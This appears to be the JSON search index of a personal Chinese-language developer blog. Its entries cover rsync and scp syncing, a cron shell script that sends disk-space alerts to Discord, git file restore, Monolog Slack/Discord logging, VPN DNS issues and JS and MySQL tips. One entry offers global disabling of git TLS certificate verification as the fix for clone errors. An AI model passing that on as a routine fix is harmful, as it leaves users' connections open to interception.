博客园](https://www.cnblogs.com/meteoric_cry/archive/2011/06/07/2074150.html)\n- [Nginx 將靜態文件響應 POST 請求，提示 405 錯誤問題](https://gist.github.com/zxhfighter/7560812)\n- [Nginx 将静态文件响应 POST 请求，提示 405 错误问题 - 千思网](https://www.qiansw.com/nginx-responds-to-the-post-request-in-the-static-file-and-prompts-405-for-the-error-problem.html)\n- [Full request/response body logging in nginx](https://gist.github.com/morhekil/1ff0e902ed4de2adcb7a)\n- [Nginx 安装 lua-nginx-module 模块 - 拼搏的小船长 - CSDN 博客](https://blog.csdn.net/qq_25551295/article/details/51744815)\n- [未連線: 潛在的安全性問題](https://notfalse.net/42/http-payload)\n- [Web Application Firewall 的偵測原理 – 軟體品管的專業思維](https://www.qa-knowhow.com/?p=4679)\n- [nginx 的 chunked_transfer_encoding 没有生效 - 开源中国](https://www.oschina.net/question/2547791_2150761)\n- [5 Open Source Web Application Firewall for Better Security](https://geekflare.com/open-source-web-application-firewall/#1-ModSecurity)\n- [不只是資安: [工具介紹] Apache 模組 mod_security - 以阻擋造訪路徑攻擊為例](http://cyrilwang.blogspot.com/2014/01/apache-modsecurity.html)\n- [Nginx 之 fastcgi_param 参数详见 - 简书](https://www.jianshu.com/p/282db1543a78)\n- [使用 curl 指令測試 REST 服務](http://blog.kent-chiu.com/2013/08/14/testing-rest-with-curl-command.html)\n- [linux - How to post raw body data with curl? - Stack Overflow](https://stackoverflow.com/questions/43054195/how-to-post-raw-body-data-with-curl)\n- [Where is php-fpm log file? Or how to activate it? Does PHP7 log errors? · Issue #48 · rlerdorf/php7dev](https://github.com/rlerdorf/php7dev/issues/48)\n- [Nginx 啟用 PHP-FPM 服務狀態監控網頁教學 - G. T. Wang](https://blog.gtwang.org/linux/nginx-enable-php-fpm-status-page-tutorial/)\n- [Where is the default zsh history file? - Stack Overflow](https://stackoverflow.com/questions/35190034/where-is-the-default-zsh-history-file)","tags":["apache"],"categories":["寫程式一些事"]},{"title":"js,php的switch差異","url":"%2Fblog%2F2019%2F03%2F26%2Fjs-php%E7%9A%84switch%E5%B7%AE%E7%95%B0%2F","content":"\n最近 JS 有一個 bug\n發現 bug 是在 switch\n我是字串跟數字去做比對\n就發現 js 不會批對到我想要的(跑去 default:去)\n趕快來筆記!!\n\n<!--more-->\n\n```js\nswitch (\"1\") {\n  case 1:\n    console.log(\"1\");\n    break;\n  case \"1\":\n    console.log(\"2\");\n    break;\n}\n```\n\nAns: 2\n\n```php\n<?php\nswitch('1'){\n    case 1:\n        echo '1';\n        break;\n    case '1':\n        echo '2';\n        break;\n}\n```\n\nAns: 1\n\nGoogle 找了一下 JS 的 switch\n\n> Description\n> Section\n> A switch statement first evaluates its expression. It then looks for the first case clause whose expression evaluates to the same value as the result of the input expression (using the strict comparison, ===) and transfers control to that clause, executing the associated statements. (If multiple cases match the provided value, the first case that matches is selected, even if the cases are not equal to each other.)\n\n裡面有提到他是用 switch 試用**三個等於**`===`\n\nPHP 是用兩個等於，可以看官網文件[PHP: switch - Manual](https://www.php.net/manual/en/control-structures.switch.php)\n","tags":["switch"],"categories":["JavaScript"]},{"title":"scp,rsync,winscp使用小記和同部備份方法","url":"%2Fblog%2F2019%2F03%2F23%2Fscp-rsync-winscp%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98%E5%92%8C%E5%90%8C%E9%83%A8%E5%82%99%E4%BB%BD%E6%96%B9%E6%B3%95%2F","content":"\n最近想同步檔案道別台機器\n想比較 scp,rsync,winscp 有什麼同步的方法\n比較一下差異\n\n<!--more-->\n\n## scp\n\n之前有寫過這篇[scp 跟 sftp 是不一樣的東西 | 程式狂想筆記](https://malagege.github.io/blog/2018/04/16/scp%E8%B7%9Fsftp%E6%98%AF%E4%B8%8D%E6%A8%A3%E7%9A%84%E6%9D%B1%E8%A5%BF/)\n所以這個沒有辦法跟 rysnc 一樣判斷同步\n但有加密功能\n使用也很簡單，不需要先 ssh 別台主機\n直接 command 使用`scp xxx@ooo:xxx fff@bbb:xxx`\n不過路徑可能要清楚是哪邊\n\n複製資料夾除了用\\*方式\n但用星號無法多層\n要使用`-r` Recursively copy entire directories\n`scp -r user@your.server.example.com:/path/to/foo /home/user/Desktop/`\n[shell - How to copy a folder from remote to local using scp? - Stack Overflow](https://stackoverflow.com/questions/11304895/how-to-copy-a-folder-from-remote-to-local-using-scp)\n\n## rsync\n\n~~跟 scp 差別預設沒有加密，但還是有辦法做加密。~~\n剛看了一下別的文章\n2004 年後預設說有做 ssh 加密\n難怪我有看到有些說預設有 ssh 加密，有些沒有...\n可參考[Rsync -e option to ssh - Unix & Linux Stack Exchange](https://unix.stackexchange.com/questions/312358/rsync-e-option-to-ssh)\n\n> Assuming you're not needing to consider the rsync protocol itself, this depends on the compilation options used for your version of rsync.\n> It used to be the case that rsync used the rsh protocol by default (unless the build-time default had been changed), but the build-time default changed to ssh in 2004.\n> If you're in doubt, start the rsync process transferring a relatively large file (or collection of files), and in another terminal run ps -ef | grep [r]sync. This will show you whether or not you're using ssh for a transport. Here's an example from one of my servers, which clearly shows the ssh transport:\n>\n> ```\n> root     28057 27173  1 09:48 pts/4    00:00:00 rsync -avHP --dry-run /home roaima@otherserver:\n> root     28058 28057  0 09:48 pts/4    00:00:00 ssh -l roaima otherserver rsync --server -vnlHogDtpre.iLsfx --partial . .\n> ```\n>\n> Finally, be aware that the compilation default can be overridden with the RSYNC_RSH environment variable. (See the man page for further details.)\n\n有時間在驗證上面到底有沒有加密\n\n他有很多參數\n目前我常用是用`-av`，不過是先前前輩給我用的設定\n我還沒搞清楚\n\n```\n\n-a, --archive 歸檔模式，表示以遞歸方式傳輸文件，並保持所有文件屬性，等於-rlptgoD\n-v, --verbose 詳細模式輸出\n--delete 刪除那些目標目錄中有而源目錄中沒有的多餘文件。這個是 rsync 做增量方式的全備份的最佳選擇方案！！！！！！\n簡單說加入`--delete`就是本基做刪除動作，但是遠端就會**做刪除**\n反之，沒家的話就不會。\n\n```\n\n詳細記紹可以看\n[SCP 和 Rsync 遠程拷貝的幾個技巧 - 散盡浮華 - 博客園](https://www.cnblogs.com/kevingrace/p/8529792.html) {% asset_link 1.png 備份圖 %}\n[SSH,SCP,rsync,sftp - 简书](https://www.jianshu.com/p/52aa5c2b872a) {% asset_link 2.png 備份圖 %}\n\n不過 window 就算有裝 git bash，但預設沒有 rsync 可以用\n所以我才會找找有沒有類似在 window winscp 做同步更新方法\n當然我也有找到 window 能用 rsync\n[Chocolatey Gallery | cwRsync (Free Edition) 5.5.0.20190204](https://chocolatey.org/packages/rsync)\n[Sync-Rsync - Visual Studio Marketplace](https://marketplace.visualstudio.com/items?itemName=vscode-ext.sync-rsync&ssr=false#overview)\n\n**2020-04-23**\n```bash\nrsync –av /etc server1:/tmp # 複製目錄和目錄下文件\nrsync –av /etc/ server1:/tmp # 只複製目錄下文件\nrsync -avh myfile.gz /home/pi/tmp/ # 複製檔案到資料夾\nrsync -avzh pi@192.168.1.12:/mypath/myfile.gz /mybackup/\nrsync -avzh --bwlimit=100K pi@192.168.1.12:/mypath/myfile.gz /mybackup/ # --bwlimit 限制頻寬\n```\n\n> -n 模擬複製過程\n> -v 顯示詳細過程\n> **-r 遞歸複製目錄樹**\n> **-p 保留權限**\n> **-t 保留時間戳**\n> **-g 保留組信息**\n> **-o 保留所有者信息**\n> **-l 將軟鏈接文件本身進行複製（默認）**\n> -L 將軟鏈接文件指向的文件複製\n> -a 存檔，相當於–rlptgoD，但不保留ACL（-A）和SELinux屬性（-X）\n> --delete  如果沒有來源檔案只有新增、沒有減少的話，它就跟一般的複製\n> -h：將數字以比較容易閱讀的格式輸出。\n\n\n## WinSCP\n\n內建也有做同步功能\n[Scripting and Task Automation :: WinSCP](https://winscp.net/eng/docs/scripting)\n[Synchronize Dialog :: WinSCP](https://winscp.net/eng/docs/ui_synchronize)\n\n其他參考來源:\n[SCP 和 Rsync 远程拷贝的几个技巧 - 散尽浮华 - 博客园](https://www.cnblogs.com/kevingrace/p/8529792.html)\n[使用 WinSCP 进行简单代码文件同步 - leestar54 - 博客园](https://www.cnblogs.com/leestar54/p/6625235.html#wiz_toc_11)\n[Synchronize Dialog :: WinSCP](https://winscp.net/eng/docs/ui_synchronize)\n[Scripting and Task Automation :: WinSCP](https://winscp.net/eng/docs/scripting)\n[厭世人生的 MIS 記事本: rsync 參數 用法](https://mga8326.blogspot.com/2018/08/rsync.html)\n[SSH,SCP,rsync,sftp - 简书](https://www.jianshu.com/p/52aa5c2b872a)\n[backup - Do you need -e ssh for rsync? - Server Fault](https://serverfault.com/questions/378939/do-you-need-e-ssh-for-rsync)\n[詳全文\\_資料備份同步工具簡介— rsync](http://newsletter.ascc.sinica.edu.tw/news/read_news.php?nid=1742)\n[rsync 備份 | Tsung's Blog](https://blog.longwin.com.tw/2005/12/rsync_ssh_backup/)\n[Rsync 備份本地及遠端目錄](https://www.opencli.com/linux/rsync-local-remote-backup)\n\n[How to Remove User and Hostname in Terminal Prompt - Make Tech Easier](https://www.maketecheasier.com/remove-user-hostname-terminal-prompt/)\n\ndate: 2019-03-31\n\n最近在 window 使用 rsync\n結果發現他還是全部檔案會傳上去\nGoogle 一下，發現要加`--modify-window=1`~~才能解決全部上傳問題~~我自己電腦測試失敗...\n但發現可能是我在 linux 做`chmod o+rx -R .`關係，因為剛開始複製是`750`\n晚點看看`--chmod=755`能否解決?\n\n但原始資料來源，做 rsync 好像正常...\n有看到用`--size-only`但這也不是最好的同步方式\n難免改檔案大小都一樣\n\n- [–checksum 和–ignore-times 选项之间的 Rsync 差异 - 代码日志](https://codeday.me/bug/20181107/355365.html)\n- [将使用 rsync 增量的文件备份到 NTFS 分区 Backup files incremental with rsync to a NTFS-Partition-rootopen.com](https://www.rootopen.com/command/view/5b28ae76d678fd520c7275dc)\n- [Linux 命令：Rsync 常见问题之 Debug | Jason's Blog](http://chengkinhung.blogspot.com/2012/09/linuxrsyncdebug.html)\n- [如何在 FAT 文件系统中使用 rsync？ | webmotociclismo.com](http://webmotociclismo.com/questions/222/ru-he-zai-fatwen-jian-xi-tong-zhong-shi-yong-rsync)\n- [一千萬個為什麽 | 僅在從 ext4 同步到 NTFS 時顯示已更改的文件](https://www.weiyeying.com/ask/4130673)\n- [chmod rsync - Google 搜尋](https://www.google.com/search?client=firefox-b-d&ei=GICgXIeLPMj-8gXliLSIDg&q=chmod+rsync&oq=chmod+rsync&gs_l=psy-ab.3..0i203j0i8i30l9.1489.5065..5199...1.0..0.70.595.11......0....1..gws-wiz.......0i71j0i67j0j0i13j0i30.50ZRAKl16jw)\n- [就是愛點鬧: Windows 下好用的檔案同步工具](http://idannow.blogspot.com/2013/03/windows.html)\n- [【 Linux 】檔案同步工具 rsync 指令 - 亞索數位筆記](https://blog.aiso.idv.tw/\n- [介绍 rsync 同步工具配置与使用，linuxlinux, linuxwindows(cwRsync) - lsbwahaha - BlogJava](http://www.blogjava.net/lsbwahaha/archive/2010/02/03/311812.html)\n- [rsync 使用简介 | 喵 ♂ 呜 的博客](https://blog.yumc.pw/posts/Rsync-Usage/)\n- [rsync：--size-only 和--ignore-times 之间的区别 | landcareweb.com](http://landcareweb.com/questions/3793/rsync-size-onlyhe-ignore-timeszhi-jian-de-qu-bie)\n- [rsync：–size-only 和–ignore-times 之间的差异 - 代码日志](https://codeday.me/bug/20170724/45245.html)\n- [–checksum 和–ignore-times 选项之间的 Rsync 差异 - 代码日志](https://codeday.me/bug/20181107/355365.html)\n- [「」checksum 和」ignore-times 選項之間的 Rsync 差異](https://question.itread01.com/fipeyp.html)\n- [–checksum 和–ignore-times 选项之间的 Rsync 差异 - 代码日志](https://codeday.me/bug/20181107/355365.html)\n\n目前我有一隻 window->linux\n\n```bash\nrsync -vr --progress --chmod=755 ./local_path/ user@ip:/path\n```\n\n參考來源：\n\n- [将使用 rsync 增量的文件备份到 NTFS 分区 Backup files incremental with rsync to a NTFS-Partition-rootopen.com](https://www.rootopen.com/command/view/5b28ae76d678fd520c7275dc)\n- [Linux 命令：Rsync 常见问题之 Debug | Jason's Blog](http://chengkinhung.blogspot.com/2012/09/linuxrsyncdebug.html)\n- [如何在 FAT 文件系统中使用 rsync？ | webmotociclismo.com](http://webmotociclismo.com/questions/222/ru-he-zai-fatwen-jian-xi-tong-zhong-shi-yong-rsync)\n","tags":["rsync"],"categories":["Linux"]},{"title":"清除vscode一個檔不同專案開啟記錄","url":"%2Fblog%2F2019%2F03%2F23%2F%E6%B8%85%E9%99%A4vscode%E4%B8%80%E5%80%8B%E6%AA%94%E4%B8%8D%E5%90%8C%E5%B0%88%E6%A1%88%E9%96%8B%E5%95%9F%E8%A8%98%E9%8C%84%2F","content":"\n最近很常開專案開啟額外不同的檔案\n有時候找檔案時候就會跳出來\n所以今天有去搜尋要怎麼清掉\n如下\n\n<!--more-->\n\n{% asset_img 1.jpg F1 %}\n\n喝喝，就是這麼簡單\n簡單都怕忘掉\n","tags":["vscode"],"categories":["vscode"]},{"title":"簡單使用shell做個硬碟空間警告discord通知","url":"%2Fblog%2F2019%2F03%2F21%2F%E7%B0%A1%E5%96%AE%E4%BD%BF%E7%94%A8shell%E5%81%9A%E5%80%8B%E7%A1%AC%E7%A2%9F%E7%A9%BA%E9%96%93%E8%AD%A6%E5%91%8Adiscord%E9%80%9A%E7%9F%A5%2F","content":"\n最近研究出來 discord webhook\n想說讓我的動物機玩玩\n但是動物機只有裝 python\n也沒看到 monolog for discord\n~~不想自幹~~因為我不熟 python\n原本想說使用看看 nodejs\n不過想說用原生 shell 看看\n不用安裝環境\n\n<!--more-->\n\n隨便 google 爬了一個範例[Shell script to watch the disk space - nixCraft](https://www.cyberciti.biz/tips/shell-script-to-watch-the-disk-space.html)\n因為有語系關係，所以有調整程式碼\n\n> 踩雷注意!!!\n> xxx(string): not found\n> shell =前後盡量不要有空白\n\n```sh\n#!/bin/sh\ndf -H | grep -vE '^Filesystem|tmpfs|cdrom|udev|已用' | awk '{ print $5 \" \" $1 }' | while read output;\ndo\n  echo $output\n  usep=$(echo $output | awk '{ print $1}' | cut -d'%' -f1  )\n  partition=$(echo $output | awk '{ print $2 }' )\n  if [ $usep -ge 80 ]; then\n    msg=\"注意快超出硬碟空間\\\\\\\"$partition\\\\\\\" ($usep%) on $(hostname) as on $(date)\"\n    url='https://discordapp.com/api/webhooks/*'\n    curl -H \"Content-Type: application/json\" \\\n    -X POST \\\n    -d \"{\\\"username\\\": \\\"system\\\", \\\"content\\\": \\\"${msg}\\\"}\" $url\n  fi\ndone\n```\n\n剩下就是設定一下排程\n\n```sh\n0 18 * * * sh /root/notify/disk.sh > /dev/null 2>&1\n```\n\n任務完成!!\n\n備注:\nDiscord Webhook 可以參考這篇下面[使用 monolog 和 slack 做 webhook 小記 | 程式狂想筆記](https://malagege.github.io/blog/2019/03/19/%E4%BD%BF%E7%94%A8monolog%E5%92%8Cslack-%E5%81%9Awebhook%E5%B0%8F%E8%A8%98/)\n記得上面 code 要把網址換掉\n","tags":["linux"],"categories":["Linux"]},{"title":"git從某一個commit還原某一個檔案和git log搜尋檔案方法","url":"%2Fblog%2F2019%2F03%2F21%2Fgit%E5%BE%9E%E6%9F%90%E4%B8%80%E5%80%8Bcommit%E9%82%84%E5%8E%9F%E6%9F%90%E4%B8%80%E5%80%8B%E6%AA%94%E6%A1%88%E5%92%8Cgit-log%E6%90%9C%E5%B0%8B%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95%2F","content":"\n最近修改程式，想還原之前某一隻檔案的時候\n下意識想做`git reset`\n但是突然想到我只想還原一個檔案\n雖然我有 vscode 可以用 gitlens 去看之前檔案全選出來\n但還是覺得看看有沒有找檔案的方式\n\n<!--more-->\n\n## git 從某一個 commit 還原某一個檔案\n\n最後找到用`git checkout`方式還原\n等等，我記得之前運用都是當下 commit 還原一個檔案\n沒想到她竟然還有指定 commit 功能?!!\n\n這邊可能很多人會忘記`git checkout`跟`git reset`還原差異\n可以看裡面的圖，幫助回憶[git reset 和 git reflog 小記 | 程式狂想筆記](https://malagege.github.io/blog/2018/11/09/git-reset-%E5%92%8Cgit-reflog%E5%B0%8F%E8%A8%98/)\n\n### one file recover\n\n```bash\n## 還原指定一隻檔案\n## head -- 可以省略(前提不要跟自己的branch撞到名子就好，通常撞到機率低)\ngit checkout head -- application/controllers/xxxx/xxxx.php\ngit checkout b01* -- application/controllers/line/LibraryPlaylist.php\ngit checkout head -- application/controllers/line/LibraryPlaylist.php\n```\n\n### all file recover\n\n```\ngit reset HEAD\n```\n\n##\n\n[Git 還原單一檔案 | 愛吃東西的 RD](http://www.andrewchen.tw/2017/02/11/20170211_NOTE_git%E9%82%84%E5%8E%9F%E5%96%AE%E4%B8%80%E6%AA%94%E6%A1%88/)\n\n## git log 搜尋檔案方法\n\n常常使用 gitlens 功能\n他有一個很神奇功能\n可以看當下檔案存在那些 commit\n看當下行數有存在那些 commit\n今天好奇查了一下指令要怎麼下\n\n### file history\n\n```bash\ngit log '*/xxxx.php'\n```\n\n### line history\n\n```bash\ngit log -L 103,103:application/xxxx/xxxx.php\n```\n\n### gitk log\n\n```bash\ngitk '*/Trackinfo.php'\n#這邊L後面數字要連在一起\ngitk -L103,103:application/models/line/api/Mod_libraryPlaylist.php\n```\n","tags":["git"],"categories":["Git"]},{"title":"使用monolog和slack 做webhook小記","url":"%2Fblog%2F2019%2F03%2F19%2F%E4%BD%BF%E7%94%A8monolog%E5%92%8Cslack-%E5%81%9Awebhook%E5%B0%8F%E8%A8%98%2F","content":"\n最近在看 monolog 程式如何使用\n不過這篇不會詳細記錄 monolog\n這篇主要是記錄 slack webhook\n怕之後會忘記要怎麼串接 webhook\n\n<!--more-->\n\n雖然我平常沒有什麼在玩 slack\n同事有開一個 slack，但沒有什麼人再用\nmonolog 內建有 slack\n\nslack 我有 google 到一篇說可以用三種方式連線\n[嘗試利用 slack api 發送訊息到 teams 內 – taihua – Medium](https://medium.com/@taihua/slack-api-%E5%98%97%E8%A9%A6%E7%99%BC%E9%80%81%E8%A8%8A%E6%81%AF%E5%88%B0team%E5%85%A7-6d88070cacd5)\n今天簡單使用 webhook 方式連\n\n首先，從這邊登入[Slack API: Applications | Slack](https://api.slack.com/apps?new_app=1)\n可以`create app`\n\n{% asset_img 1.png \"create app\" %}\n{% asset_img 2.png \"add webhook\" %}\n點選 on，下面`add webhook ...`按鈕點下去\n會跳出授權頁面，這時候你只要選擇頻道或使用者\n會得到一串網址\n\n接下來 monolog 使用 slack webhook\n簡單使用如下\n就只要把 webhook 網址帶進去就可以用了(太簡單了)\n\n```php main.php\n<?php\nrequire_once './vendor/autoload.php';\n\nuse Monolog\\Logger;\nuse Monolog\\Handler\\StreamHandler;\nuse Monolog\\Handler\\SlackWebhookHandler;\n\n// create a log channel\n$log = new Logger('name');\n$log->pushHandler(new StreamHandler('path/to/your.log', Logger::WARNING));\n$log->pushHandler(new SlackWebhookHandler('https://hooks.slack.com/services/xxxxx'));\n\n// add records to the log\n$log->warning('Foo');\n$log->crit('中文測試');\n```\n\n{% asset_img 3.png 成果圖 %}\n\n這邊還需要注意一件事情\n`$log->pushHandler(new SlackWebhookHandler('https://hooks.slack.com/services/xxxxx'));`\n這邊沒有指定 level 等級\n我發現 monolog 原生物件 hanlder 每一個預設 level 都不太一樣\n以這邊 slack 為例，他預設是`$level = Logger::CRITICAL`\nPS 所以上方的 warning 程式不會在 slack 出現\n不知道的話可以直接看原始碼比較快\n\n[The PHP Package 之 monolog 不完全但够用指南 - 后端 - 掘金](https://juejin.im/entry/574f072d49830c00584680de)\n[错误与日志 | 《Laravel 5.4 中文文档》 | Laravel China 社区 - 高品质的 Laravel 开发者社区](https://learnku.com/docs/laravel/5.4/errors/1249)\n\n> 一旦配置了此选项，Laravel 将记录大于或等于指定日志等级的所有级别。例如，默认将 log_level 设置为 error 那么将会记录 error , critical , alert 和 emergency 日志信息。\n> Monolog 识别以下日志等级 - 从低到高为: debug , info , notice , warning , error , critical , alert , emergency。\n\n這邊先小記，哈哈，不知道之後有沒有有空再寫一篇\n\n話說 flexget 好像也能做 slack,discord\n剛好最近有用 discord\n有空研究看看\n\n2019-03-20\n\n今天剛好看到 github 有 discord 的 webhook 現成工具\n[lefuturiste/monolog-discord-handler: A simple discord handler for support Discord webhooks](https://github.com/lefuturiste/monolog-discord-handler)\n原本要找 webhook\n進去 discord 開發者頁面找不到 webhook\n後來 google 一下\n原來可以到`頻道設定`裡面有 webhook\n輕鬆就能新增 webhook\n\n{% asset_img 4.png '頻道設定1' %}\n{% asset_img 5.png '頻道設定2' %}\n\n程式碼\n\n```php discord.php\n<?php\nrequire_once './vendor/autoload.php';\n\nuse Monolog\\Logger;\n\n$log = new Monolog\\Logger('your name');\n\n$log->pushHandler(new DiscordHandler\\DiscordHandler([\n'https://discordapp.com/api/webhooks/xxxxxxxxx/ooooooooooooooooooooooooooooooooooooooooo'\n], 'name', 'subname', 'DEBUG'));\n\n\n// add records to the log\n$log->warning('Foo');\n$log->crit('中文測試');\n```\n\n{% asset_img 6.png 成果 %}\n","tags":["slack"],"categories":["PHP"]},{"title":"git不能clone下來的問題","url":"%2Fblog%2F2019%2F03%2F16%2Fgit%E4%B8%8D%E8%83%BDclone%E4%B8%8B%E4%BE%86%E7%9A%84%E5%95%8F%E9%A1%8C%2F","content":"\n網路找到很多這個解法\n\n<!--more-->\n\n## HTTPS 解除 SSL 憑證檢查\n\n### 設定全域不檢查方法\n\n```bash\ngit config --global http.sslVerify false\n```\n\n### 設定當下不檢查 SSL 方法\n\n原本想說看有沒有暫時的語法\n後來找到這個\n\n```\n1.创建临时环境变量：\n\nwindows上命令行输入：\n\nset GIT_SSL_NO_VERIFY=true git clone\n\nLinux下：\n\nenv GIT_SSL_NO_VERIFY=true git push\n```\n\n但我的 window 的 git bash 上面指令都不管用\n不過我後來找到一篇用\n\n```bash\nexport GIT_SSL_NO_VERIFY=1\n```\n\n可以解決\n\n[执行 Git 命令时出现各种 SSL certificate problem 的解决办法 - officercat 的专栏 - CSDN 博客](https://blog.csdn.net/officercat/article/details/39989837)\n[git - How do I set GIT_SSL_NO_VERIFY for specific repos only? - Stack Overflow](https://stackoverflow.com/questions/9008309/how-do-i-set-git-ssl-no-verify-for-specific-repos-only)\n[Git ssl error on windows - Stack Overflow](https://stackoverflow.com/questions/7526182/git-ssl-error-on-windows)\n\n### 改成 SSL 方法也能解決這個問題\n\n另外，還有一種方法就是改成用 ssh 方法\ngit clone 也能解決這個問題\n","tags":["git"],"categories":["Git"]},{"title":"VPN後導置DNS改變無法連到內網網址","url":"%2Fblog%2F2019%2F03%2F14%2FVPN%E5%BE%8C%E5%B0%8E%E7%BD%AEDNS%E6%94%B9%E8%AE%8A%E7%84%A1%E6%B3%95%E9%80%A3%E5%88%B0%E5%85%A7%E7%B6%B2%E7%B6%B2%E5%9D%80%2F","content":"\n最近連到 VPN，有同事反應連不到內網的 gitlab\n由於我們 MIS 有改 Gitlab 網址(原本是 IP)\n改成網址(git.xxx.com.tw)\n但是連 VPN 後怎麼連不到\n\n<!--more-->\n\n由於我有一個朋友是做網路的\n所以有問他這個問題\n當你連 VPN 的時候，可能對方會重新寫入你的路由設定\nDNS 也會被改變(本次的地雷)\n\nLinux 看路由方法\n\n```bash\n> ip route show\ndefault dev ppp0 scope link\ndefault via 192.168.1.1 dev wlp3s0 proto dhcp metric 600\n168.95.xxx.xxx dev ppp0 proto kernel scope link src 118.x.xx.xxx\n169.x.0.0/16 dev wlp3s0 scope link metric 1000\n172.17.0.0/16 dev docker0 proto kernel scope link src 172.17.0.1\n192.168.1.0/24 dev wlp3s0 proto kernel scope link src 192.168.1.121 metric 600\n```\n\nwindow 看路由方法\n\n```bash\n> route print\nIPv4 路由表\n===========================================================================\n使用中的路由:\n網路目的地                 網路遮罩         閘道          介面       計量\n          0.0.0.0          0.0.0.0      192.168.1.1    192.168.1.111     35\n          0.0.0.0          0.0.0.0          6.0.0.1          6.1.1.1   5025\n          6.0.0.0        255.0.0.0            在連結上           6.1.1.1    281\n          6.1.1.1  255.255.255.255            在連結上           6.1.1.1    281\n    6.255.255.255  255.255.255.255            在連結上           6.1.1.1    281\n        10.10.1.0    255.255.255.0            在連結上         10.10.1.1    291\n```\n\n連 VPN 我看了一下結果，VPN 並非把所有 IP 都做 defualt gateway\n他很明確把`10.10.xx.xx`那些 IP 導向那邊去\n\n所以我在 VPN 就連`192.168.x.x`(gitlab IP 位置)\n空白網頁(網址有導向 git.xxxx.com.tw)\n這時候我懷疑了 DNS\n\nDNS 看了一下\n果然連 VPN 的時候跟沒連的 DNS 位置不一樣\n\n然後過幾天，副理出國遠端電腦發現不能連 git\n也是一樣的問題 XDD\n\n寫一篇筆記，留意這個問題\n\n網路小筆記\n一般設定 GateWay IP，通常設定固定 IP 的時候，可能會不知道這是幹什麼用？\n但是今天問同學，他有簡單說明這個用途\n之前想說沒輸入這個應該可有可無也可以連\n\n發送 IP 的時候，我們電腦在不同網域的時候\n已定要送到 gateway\n不然不同網域誰知道要往哪裡送出\n\n所以我以前電腦就算沒有設定 gateway 連相同網段也不會有問題\n相同網段可能不需要找吧(XD 不確定)\n\n簡單有問同學，直接連別台 PC 電腦，那是不是也可以做一樣的事情\n我同學說可以。恍然大悟，原來 gateway 設定對網路這一快也是很重要\n今天又學到一個重要的知識!!!\n\nnslookup 查詢 dns 解析方法\n`server dns`\n{% asset_img 1.jpg DNS查詢 %}\n[PChome Online - 股市](http://faq.extra.pchome.com.tw/faq_content02.htm?exh_no=P000007&pexh_no=P000181&cexh_no=H000185&faq_id=327&qnum=1)\n"},{"title":"MySQL浮點數運算，解決輸出到程式後面尾數有0的方法","url":"%2Fblog%2F2019%2F03%2F13%2FMySQL%E6%B5%AE%E9%BB%9E%E6%95%B8%E9%81%8B%E7%AE%97%EF%BC%8C%E8%A7%A3%E6%B1%BA%E8%BC%B8%E5%87%BA%E5%88%B0%E7%A8%8B%E5%BC%8F%E5%BE%8C%E9%9D%A2%E5%B0%BE%E6%95%B8%E6%9C%890%E7%9A%84%E6%96%B9%E6%B3%95%2F","content":"\n最近用 MySQL 做浮點數運算\nPHP 程式輸出竟然有`123.30000`\n後來網路上有看到解法\n\n<!--more-->\n\n> 正確的解決方式：\n> select 0+cast(90.09008700 as char ) 輸出結果 90.090087\n> 或者\n> select 0+CONVERT(‘90.09008700‘ , CHAR) 輸出結果：90.090087\n\n參考內容:\n[mysql 之處理金錢小數點後的多余 0 - IT 閱讀](https://www.itread01.com/content/1535301491.html)\n[SQL 中如何去掉 decimal 字段後面的 0 - donnie88888888 的专栏 - CSDN 博客](https://blog.csdn.net/donnie88888888/article/details/52439299)\n","tags":["zero"],"categories":["SQL"]},{"title":"js做物件reduce運算技巧(map,reduce)","url":"%2Fblog%2F2019%2F03%2F13%2Fjs%E5%81%9A%E7%89%A9%E4%BB%B6reduce%E9%81%8B%E7%AE%97%E6%8A%80%E5%B7%A7-map-reduce%2F","content":"\n最近想用 js 去做運算\n發現使用 reduce 做物件院算發生問題\n有爬文找到方法\n這邊簡單做紀錄\n\n<!--more-->\n\n```js\nthis.filterData..reduce( (a , b )=> Number(a.total) + Number(b.total) ).toFixed(4);\n```\n\n當初沒有仔細看 reduce 文件\n當第一次進去 reduce 代的參數都會帶入 1,2 位置\n第一圈可能會沒問題，但是第二圈`a`不是物件，是第一圈 return 的值\n所以程式都會有問題\n改要怎麼解決這個問題\n有找到兩個解法\n\n[functional programming - Javascript reduce on array of objects - Stack Overflow](https://stackoverflow.com/questions/5732043/javascript-reduce-on-array-of-objects)\n[上手使用 JavaScript 的 Map、Reduce 吧！](http://fred-zone.blogspot.com/2017/01/javascript-mapreduce.html)\n\nreduce 第二個參數，是 intial value，放入的時候第一個`a`會代 `0`進去\n所以後面不會錯\n另一個方法是用 map 來整理資料，在做 reduce\n第二種會比較舒服\n\n```js\nthis.filterData\n  .map(v => Number(v.total))\n  .reduce((a, b) => a + b)\n  .toFixed(4);\nthis.filterData.reduce((a, { total }) => a + +total, 0).toFixed(4);\n```\n\n[如何在 Array.forEach 的循环里 break](http://jser.me/2014/04/02/%E5%A6%82%E4%BD%95%E5%9C%A8Array.forEach%E7%9A%84%E5%BE%AA%E7%8E%AF%E9%87%8Cbreak.html)\n\n[js 中**proto**和 prototype 的区别和关系？ - 知乎](https://www.zhihu.com/question/34183746)\n"},{"title":"我的JavaScript筆記","url":"%2Fblog%2F2019%2F03%2F10%2F%E6%88%91%E7%9A%84JavaScript%E7%AD%86%E8%A8%98%2F","content":"\n由於今天上課\n簡單小記今天上課我覺得記不住，但是該紀錄的筆記\n有可能會記入錯誤\n所以算是我的觀點\n有錯不要怪我喔!!有錯不要怪我喔!!有錯不要怪我喔!!\n想真的了解 JS，可以自己 Google 一下核心部分課程\n應該也只有一個人教(就不打廣告了)\n這邊是我的筆記(我覺得重要的)\n\n<!--more-->\n\n變數是指標，指向記憶體中的資料\n\n宣告變數`var`的同時，也會成為某物件下的屬性 (不一定是根物件,ex:function)\n屬性可以用 delete 刪除，`變數**無法**被刪除\n\nvar 在一般外面 function 宣告，會寫在 window\nfunction 寫在 ao 物件[ECMA-262 Javascript 核心](http://notepad.yehyeh.net/Content/WebDesign/Javascript/ECMA/Core/JavaScriptCore.php#section7)\n\n```js\nNumber.prototype.name = \"Hello\";\nvar a = 1;\n\nconsole.log(a.name); // 'Hello' number 祖先關係，原型\n\ndelete a.name;\n// ture 刪一個不存在地方，會回傳 true \\*這一點真的會讓人家以為有刪除成功\n\na.name;\n//Hello\n```\n\nvar 與 let 的範圍\n\nJavaScript 裡的型別\n\n原始型別\n\n- number\n- string\n- boolean\n- null\n- undefined\n- symbol\n- 物件型別\n\n原始型別\n\n屬性不可添加(但可以擺繼承 